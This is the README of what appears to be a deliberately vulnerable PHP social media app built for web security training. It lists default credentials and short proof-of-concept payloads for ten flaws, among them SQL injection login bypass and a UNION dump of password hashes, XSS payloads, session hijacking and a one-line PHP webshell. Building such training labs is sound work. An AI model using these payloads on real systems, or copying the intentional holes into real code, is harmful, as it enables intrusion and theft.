# VulnSphere
VulnSphere is a realistic social media web application built with intentional security vulnerabilities for penetration testing and web security training. It is based on the OWASP Top 10. Vulnerabilities are embedded naturally and are not labeled in the source code.
This project is for educational use only. Do not deploy it on a public server.
## Stack
PHP 7.4+, SQLite, Vanilla JS/CSS. No frameworks or dependencies.
## Setup
```bash
git clone https://github.com/nxllnv/vulnsphere.git
cd vulnsphere
cp .env.example .env
php setup.php
php -S localhost:8080
```
## Accounts (Username / Password)
- admin / admin123 (admin)
- alice_dev / alice2024 (user)
- b0bbydrops / admin (user)
## Vulnerabilities & POC
### 1. SQL Injection (Login)
The login query uses string concatenation. You can bypass authentication and log in as the admin user.
Username: `' OR '1'='1'--`
Password: `anything`
### 2. SQL Injection (Search)
The search field passes input directly into a raw SQL query. Dump all usernames and password hashes.
Search query: `' UNION SELECT id,username,password,email,bio,avatar,role,remember_token,created_at,updated_at FROM users--`
### 3. Stored XSS (Comments)
Comment content is stored and rendered without sanitization. Runs on every page load for visitors.
Comment: `<script>alert('XSS')</script>`
### 4. Stored XSS (Profile Bio)
The bio field is rendered as raw HTML. Triggers for anyone who visits the profile.
Bio: `<img src=x onerror="alert('bio XSS')">`
### 5. Reflected XSS (Login Error)
The error parameter in the URL is reflected directly into the page without encoding.
URL: `http://localhost:8080/index.php?page=login&error=<script>alert('XSS')</script>`
### 6. IDOR (Post Deletion)
There is no ownership check on the delete endpoint. Note the ID of a post you don't own, and visit:
URL: `http://localhost:8080/index.php?page=post-delete&id=1`
### 7. Weak Password Hashing
Passwords are stored as unsalted MD5 hashes, making them trivial to crack.
```bash
# admin123 MD5 hash
0192023a7bbd73250516f069df18b500
```
### 8. Predictable Session Token
Tokens are generated as `md5(userId + time() + username)`. Admin panel displays all active tokens in plaintext.
You can steal a token and hijack the session by setting your `vs_session` cookie to that token.
### 9. Insecure File Upload
The `.php` extension is allowed. Upload a webshell via the avatar or post image field.
File content: `<?php system($_GET['cmd']); ?>`
Access it at: `http://localhost:8080/public/uploads/posts/shell.php?cmd=id`
### 10. Information Disclosure (Admin Panel)
The admin panel at `/index.php?page=admin` exposes active session tokens, PHP version, server software, and a raw SQL query runner.
## License
MIT
